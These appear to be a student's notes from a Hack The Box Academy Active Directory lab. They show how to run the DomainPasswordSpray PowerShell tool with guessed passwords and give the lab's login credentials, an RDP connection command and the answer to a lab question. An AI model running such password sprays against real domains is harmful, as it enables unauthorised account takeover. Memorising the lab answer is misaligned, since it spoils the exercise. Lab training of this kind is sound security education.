
>[!Info]
> Use the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool if authenticated to the domain.
> The tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.

##### Using DomainPasswordSpray 
```go
Import-Module .\DomainPasswordSpray.ps1
```

```go
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

# Questions

Username
```go
htb-student
```

Password
```go
Academy_student_AD!
```


Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.
```go
dbranch
```

```go
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

```go
xfreerdp /v:10.129.36.162 /u:htb-student /p:'Academy_student_AD!' /cert:ignore /drive:WindowsSpray,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks /f
```

